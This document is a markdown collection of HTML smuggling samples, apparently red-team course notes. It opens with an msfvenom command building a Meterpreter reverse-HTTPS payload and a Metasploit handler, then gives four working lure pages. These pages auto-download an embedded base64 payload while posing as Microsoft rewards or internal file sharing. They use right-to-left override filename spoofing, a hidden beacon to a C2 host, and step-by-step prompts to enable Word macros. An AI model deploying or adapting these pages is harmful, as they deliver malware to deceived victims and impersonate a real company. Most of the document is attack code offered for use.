
### HTML Smuggling Sample Collection


#### OSEP sample

**Steps:**
1. Create shell code usigng any c2 u like for example Meterpreter
    ```bash
    # Generate staged Meterpreter payload
    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
    
    # Start Metasploit multi/handler
    sudo msfconsole -q
    use multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set lhost 192.168.119.120
    set lport 443
    exploit
    
    ``` 
3. Base64 encode the `.exe` file:
    
    ```bash
    base64 -w 0 /var/www/html/msfstaged.exe
    
    ```
    
4. Embed into HTML with JavaScript:
    
    ```html
    <html>
        <body>
            <script>
                function base64ToArrayBuffer(base64) {
                    var binary_string = window.atob(base64);
                    var len = binary_string.length;
                    var bytes = new Uint8Array(len);
                    for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                    return bytes.buffer;
                }
    
                var file = 'TVqQAAMAAAAEAAAA//8AALgAAAA...'; // base64 of msfstaged.exe
                var data = base64ToArrayBuffer(file);
                var blob = new Blob([data], {type: 'octet/stream'});
                var fileName = 'msfstaged.exe';
    
                var a = document.createElement('a');
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            </script>
        </body>
    </html>
    
    ```
    
    ### 🔹 **Effect:**
    
    - **No user interaction needed** to click download explicitly.
    - Downloads **automatically when the victim opens the webpage**.
    - Uses JavaScript + Blob + `window.URL.createObjectURL`.
  **Minimalistic payload delivery with no user interaction—ideal for C2 testing and training scenarios.**
#### My samples
1. Sample 1: Basic Download with Legacy Support
   
    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Internal File Sharing Service</title>
    </head>
    <body>
      <h1>Your download will start in a few seconds...</h1>
    
      <script>
        function base64ToArrayBuffer(base64) {
          const binary_string = window.atob(base64);
          const len = binary_string.length;
          const bytes = new Uint8Array(len);
          for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
          }
          return bytes.buffer;
        }
    
        // Replace this with actual base64 string (without angle brackets or comments)
        const base64File = '<< BASE64 ENCODING OF FILE >>';
        const fileName = 'policies.doc';
    
        if (base64File.startsWith('<<')) {
          console.error('Base64 data is missing.');
        } else {
          const data = base64ToArrayBuffer(base64File);
          const blob = new Blob([data], { type: 'application/octet-stream' });
    
          if (window.navigator.msSaveOrOpenBlob) {
            // For IE/Edge
            window.navigator.msSaveOrOpenBlob(blob, fileName);
          } else {
            // For modern browsers
            const a = document.createElement('a');
            const url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
          }
        }
      </script>
    </body>
    </html>  
    ```
      + Added cross-browser support, including fallback for Internet Explorer / Edge via msSaveOrOpenBlob.
      
      + Structured with basic HTML for easier customization in internal lures (e.g., “Internal File Sharing”).
      
      + Clear error message if base64 is not embedded properly.
      
      **🔸 Enhancements:**
      + Legacy support for MS browsers
      + Graceful error handling
      + Clean UI for internal environments

2. Sample 2: Fake Reward Page with UI/UX Tricks
   ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <title>Reward Center - Prize Claim</title>
      <style>
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(to right, #4facfe, #00f2fe);
          color: #333;
          margin: 0;
          padding: 0;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          height: 100vh;
          text-align: center;
        }
        .container {
          background-color: #fff;
          padding: 30px;
          border-radius: 12px;
          box-shadow: 0 0 15px rgba(0,0,0,0.1);
          max-width: 500px;
        }
        h1 {
          color: #27ae60;
          margin-bottom: 10px;
        }
        p {
          margin: 10px 0;
        }
        .loader {
          border: 4px solid #f3f3f3;
          border-radius: 50%;
          border-top: 4px solid #3498db;
          width: 30px;
          height: 30px;
          animation: spin 1s linear infinite;
          margin: 20px auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .hidden {
          display: none;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🎉 Congratulations!</h1>
        <p>You’ve been selected to receive a loyalty reward 🎁</p>
        <p>Your download will begin automatically...</p>
        <div class="loader"></div>
        <p class="hidden" id="doneMsg">If your download hasn’t started, <a href="#" id="manualLink">click here</a>.</p>
      </div>
    
      <script>
        function base64ToArrayBuffer(base64) {
          const binary_string = window.atob(base64);
          const len = binary_string.length;
          const bytes = new Uint8Array(len);
          for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
          }
          return bytes.buffer;
        }
    
        const base64File = '<< BASE64 ENCODED PAYLOAD HERE >>'; // Replace with real base64
        const fileName = 'Reward_Claim.doc'; // Can be .exe, .pdf.exe, etc.
    
        function triggerDownload(data, filename) {
          const blob = new Blob([data], { type: 'application/octet-stream' });
    
          if (window.navigator.msSaveOrOpenBlob) {
            window.navigator.msSaveOrOpenBlob(blob, filename);
          } else {
            const a = document.createElement('a');
            const url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
          }
    
          document.getElementById('doneMsg').classList.remove('hidden');
          document.getElementById('manualLink').href = window.URL.createObjectURL(blob);
        }
    
        // Simulate short loading delay before download
        setTimeout(() => {
          if (base64File.startsWith('<<')) {
            alert('Download error: Payload missing or not embedded.');
          } else {
            const buffer = base64ToArrayBuffer(base64File);
            triggerDownload(buffer, fileName);
          }
        }, 3000);
      </script>
    </body>
    </html>
   ```
     + Mimics a reward center with a congratulatory message.
  
    + Adds loader animation to simulate legitimacy and delay execution.
  
    + Manual fallback link provided if automatic download fails.
  
    + Cleaner UI with styled modal, ideal for phishing-themed lures.
  
    **🔸 Enhancements:**
    
    + Improved social engineering appeal through visual deception
    
    + Simulated delay to mimic file generation
    
    + Manual fallback via link ensures delivery even if JS auto-download is blocked
    
    + Can use dual extensions like .pdf.exe for obfuscation

  3. Sample 3: Microsoft 365 Themed Page with Countdown and Beacon
     
      ```html
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <title>Microsoft 365 Loyalty Reward</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to right, #4facfe, #00f2fe);
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
          }
          .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            max-width: 500px;
          }
          h1 {
            color: #0078d7;
            margin-bottom: 10px;
          }
          p {
            margin: 10px 0;
          }
          .loader {
            border: 4px solid #f3f3f3;
            border-radius: 50%;
            border-top: 4px solid #0078d7;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          .hidden {
            display: none;
          }
          @media (prefers-color-scheme: dark) {
            body {
              background: #121212;
              color: #eee;
            }
            .container {
              background-color: #1e1e1e;
              color: #eee;
            }
          }
        </style>
      </head>
      <body>
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" style="width:120px; margin-bottom: 20px;" />
        <div class="container">
          <h1>🎉 Microsoft Loyalty Reward</h1>
          <p>You’ve been selected to receive a reward as a valued Microsoft 365 user.</p>
          <p>Your reward document is being prepared...</p>
          <p id="countdown">Starting download in <span id="seconds">5</span> seconds...</p>
          <div class="loader"></div>
          <p class="hidden" id="doneMsg">If your download hasn’t started, <a href="#" id="manualLink">click here</a>.</p>
        </div>
      
        <img src="https://yourc2.tld/tracker?id=uniqueid" style="display:none;" /> <!-- Beacon -->
      
        <script>
          function base64ToArrayBuffer(base64) {
            const binary_string = window.atob(base64);
            const len = binary_string.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) {
              bytes[i] = binary_string.charCodeAt(i);
            }
            return bytes.buffer;
          }
      
          const base64File = '<<BASE64_PAYLOAD>>'; // Replace with real payload
          const fileName = 'RewardClaim\u202Efdp.exe'; // Displays as RewardClaim.pdf
      
          let sec = 5;
          const countdown = setInterval(() => {
            sec--;
            document.getElementById('seconds').textContent = sec;
            if (sec === 0) clearInterval(countdown);
          }, 1000);
      
          setTimeout(() => {
            if (base64File.startsWith('<<')) {
              alert('Error: Payload missing.');
              return;
            }
      
            const buffer = base64ToArrayBuffer(base64File);
            const blob = new Blob([buffer], { type: 'application/octet-stream' });
      
            if (window.navigator.msSaveOrOpenBlob) {
              window.navigator.msSaveOrOpenBlob(blob, fileName);
            } else {
              const a = document.createElement('a');
              const url = window.URL.createObjectURL(blob);
              a.href = url;
              a.download = fileName;
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              window.URL.revokeObjectURL(url);
              document.getElementById('manualLink').href = url;
            }
      
            document.getElementById('doneMsg').classList.remove('hidden');
      
            setTimeout(() => {
              window.location.href = 'https://www.microsoft.com/en-us/rewards';
            }, 4000);
          }, 5000);
        </script>
      </body>
      </html>
      ```
          
      + Adds Microsoft 365 branding and corporate theme for added trust.
  
      + Embeds countdown timer to create urgency and anticipation.
      
      + Uses Right-to-Left override (RLO) in filename: \u202Efdp.exe appears as .pdf.
      
      + Includes beaconing pixel for C2 tracking (<img src="...">).
      
      + Auto-redirects to a legitimate Microsoft page after download to mask the attack.
      
      **🔸 Enhancements:**
      
      +  Countdown timer for psychological manipulation
      
      +  RLO filename spoofing to trick victims visually
      
      +  Covert beacon triggers C2 hit upon access
      
      +  Redirection after download enhances legitimacy
        
4. sample 4
   ```html
   <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta http-equiv="refresh" content="12;url=https://rewards.microsoft.com/">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Microsoft Annual Reward 2025</title>
      <style>
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(to bottom right, #f3f9ff, #e0edff);
          margin: 0;
          padding: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
        }
        .container {
          text-align: center;
          background: #ffffff;
          padding: 40px;
          border-radius: 15px;
          box-shadow: 0 0 20px rgba(0,0,0,0.1);
          max-width: 500px;
        }
        h1 {
          color: #0078D7;
          margin-bottom: 20px;
        }
        p {
          font-size: 1rem;
          color: #333;
        }
        .instructions {
          margin-top: 20px;
          text-align: left;
          font-size: 0.95rem;
          background: #f1f8ff;
          padding: 15px;
          border-left: 4px solid #0078D7;
        }
        .download {
          margin-top: 25px;
        }
        .loader {
          margin: 20px auto;
          border: 5px solid #f3f3f3;
          border-top: 5px solid #0078D7;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
      <script>
        window.onload = function() {
          const b64Data = `
            // <<< REPLACE THIS LINE with YOUR base64 string >>>
          `.replace(/\s+/g, '');
          const byteCharacters = atob(b64Data);
          const byteArrays = [];
    
          for (let offset = 0; offset < byteCharacters.length; offset += 512) {
            const slice = byteCharacters.slice(offset, offset + 512);
            const byteNumbers = new Array(slice.length);
            for (let i = 0; i < slice.length; i++) {
              byteNumbers[i] = slice.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            byteArrays.push(byteArray);
          }
    
          const blob = new Blob(byteArrays, { type: 'application/vnd.ms-word.document.macroEnabled.12' });
          const link = document.createElement('a');
          link.href = URL.createObjectURL(blob);
          link.download = "RewardClaim‮cod.docm"; // RTL spoof
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
        };
      </script>
    </head>
    <body>
      <div class="container">
        <h1>🎉 Congratulations!</h1>
        <p>You’ve been selected for the <strong>Microsoft 2025 Annual Recognition Reward</strong>.</p>
        <div class="loader"></div>
        <p class="download">Your reward document is downloading...</p>
        <div class="instructions">
          <strong>Please follow these steps to claim your reward:</strong>
          <ol>
            <li>Open the downloaded <strong>RewardClaim.docm</strong> file.</li>
            <li>If prompted, click <strong>Enable Editing</strong>.</li>
            <li>Then click <strong>Enable Content (Macros)</strong>.</li>
            <li>If you see a <em>Protected View</em> warning, choose <strong>"Enable Editing"</strong>.</li>
          </ol>
          <p><strong>Note:</strong> The document uses a secure HR viewer powered by Microsoft Word macros.</p>
        </div>
        <p style="font-size:0.85rem; color:#888; margin-top:20px;">Redirecting you to the HR Reward Portal...</p>
      </div>
    </body>
    </html>
   ````
   + Downloads a .docm file with an embedded macro payload.

   + Uses Right-to-Left override in filename for extension spoofing.
    
   + Provides step-by-step social engineering instructions on how to enable macros.
    
   + Auto-downloads and includes meta-refresh redirect to simulate legitimate HR portal.
    
   + Payload split into 512-byte chunks to ensure reliable decoding of large base64 blobs.
    
    **🔸 Enhancements:**
    
    + Macro-enabled delivery with spoofed .docm extension
    
    + Full phishing narrative with clear user instructions
    
    + Auto-redirect enhances credibility
    
    + More robust base64 parsing (512-byte chunking)
  
